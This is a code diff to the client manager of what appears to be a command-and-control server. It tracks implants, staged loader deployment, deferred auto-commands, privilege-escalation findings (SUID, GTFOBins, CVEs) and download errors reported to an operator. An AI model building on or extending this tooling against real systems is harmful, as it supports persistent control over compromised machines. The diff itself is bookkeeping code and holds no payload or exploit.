@@ -34,10 +34,10 @@ class ClientRecord:
         first_seen: 首次上线时间
         last_seen: 最近回连时间
         results: 执行结果历史（deque 限长，S6）
-        has_init: 是否已完成初始化
         sys_user: 系统用户名
         sys_os: 操作系统信息
         sys_platform: "linux" | "windows" | "macos" | ""
+        dl_error: 最近一次 download 失败原因(权限/路径等;成功一次即清空)
     """
 
     def __init__(self, client_id: str, is_client: bool = False,
@@ -48,6 +48,11 @@ class ClientRecord:
         self.is_fork = False
         self.is_shell = False
         self.running_tasks: list = []  # 植入物 register 上报的运行中任务(task_id 列表)
+        # 分段部署(agent_stager 引导段)状态:首次上线已下发第二段(init 任务),
+        # 首次上线自动命令(auto_commands)延后到真身上线后的第一次注册补发——
+        # 引导段只 exec init 任务,同批下发的自动命令会被直接丢弃且永不补发
+        # (2026-09-15 修复)
+        self.auto_pending = False
         # 活跃会话计数(2026-09-04 B15): 同一 bid 的重叠会话各 +1, 会话结束
         # 各自 -1——原单布尔 active 在 A/B 会话重叠时 A 的 close 会清掉 B 的
         # 标记, cleanup 可能误清仍在线的 beacon; 计数在 cleanup 锁内校验
@@ -57,10 +62,10 @@ class ClientRecord:
         self.first_seen = now
         self.last_seen = now
         self.results: deque = deque(maxlen=max_results)
-        self.has_init = False
         self.sys_user = ""
         self.sys_os = ""
         self.sys_platform = ""
+        self.dl_error = ""      # R11:最近一次下载失败原因(回传给操作者看)
 
     def __repr__(self) -> str:
         kind = "Client" if self.is_client else "Beacon"
@@ -157,13 +162,6 @@ class ClientManager:
             del self._clients[client_id]
             return True
 
-    def mark_init_done(self, client_id: str) -> None:
-        """标记首次初始化完成。"""
-        with self._lock:
-            rec = self._clients.get(client_id)
-            if rec:
-                rec.has_init = True
-
     def set_sysinfo(self, client_id: str, user: str, os_str: str) -> None:
         """缓存 sysinfo 结果，自动判定平台。"""
         with self._lock:
@@ -191,7 +189,10 @@ class ClientManager:
     # 检测结论全部被丢弃, 详情页永不显示)
     _METADATA_FIELDS = ("sys_user", "sys_os", "sys_platform",
                         "priv_suid_n", "priv_suid_gtfobins_n", "priv_cve_list",
-                        "kernel_version", "sys_distro")
+                        "kernel_version", "sys_distro",
+                        # R11:download 失败原因此前不在白名单 → 结果处理器算出来了
+                        # 却被这里丢掉,操作者只看到「任务已下发」
+                        "dl_error")
 
     def update_metadata(self, client_id: str, fields: dict) -> None:
         """按白名单回填元数据字段（Q7 结果处理器）。未知键丢弃。"""
@@ -201,7 +202,8 @@ class ClientManager:
                 return
             for k, v in fields.items():
                 # 支持 str/int/list(priv_esc 回填含计数 int 与 CVE 摘要 str)
-                if k in self._METADATA_FIELDS and v not in (None, ""):
+                clearable = (k == "dl_error")   # 失败原因允许被空串清掉(R11)
+                if k in self._METADATA_FIELDS and (v not in (None, "") or clearable):
                     if isinstance(v, (str, int, list, dict)):
                         setattr(rec, k, v)
 
